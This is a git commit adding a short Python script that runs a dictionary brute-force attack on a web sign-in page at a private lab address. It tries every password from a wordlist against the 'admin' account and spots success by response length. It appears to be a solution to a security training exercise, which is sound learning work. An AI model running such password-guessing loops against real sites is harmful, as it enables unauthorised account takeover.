5c411132dd56e0a6294b3556471f518f6400e411
Guy Sharony <40563195+guysharony@users.noreply.github.com>
2023-11-10 09:22:21 +0100

    Brute force login

---
+++ brute_force_login/Ressources/brute_force.py
@@ -0,0 +1,49 @@
+import requests
+import urllib.parse
+
+def try_authentication(wrong_request_length: int, username: str, password: str):
+    print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
+    params = {
+        'page': 'signin',
+        'username': username,
+        'password': password,
+        'Login': 'Login'
+    }
+
+    encoded_params = urllib.parse.urlencode(params)
+
+    url = 'http://192.168.56.2/?{}'.format(encoded_params)
+
+    response = requests.get(url)
+    success = len(response.text) != wrong_request_length
+    print(success)
+
+    return success, response.text
+
+def read_file(path: str):
+    with open(path, 'r') as file:
+        lines = []
+
+        for line in file:
+            lines.append(line.strip())
+
+    return lines
+
+def main():
+    print("=== Brute forcing website ===")
+    username = "admin"
+    file = "dictionary.txt"
+    wrong_request_length = 1988
+    passwords = read_file(file)
+
+    for password in passwords:
+        success, response = try_authentication(wrong_request_length, username, password)
+
+        if success:
+            print(response)
+            return
+
+    print(f"Password for username {username} is not in list.")
+
+if __name__ == "__main__":
+    main()
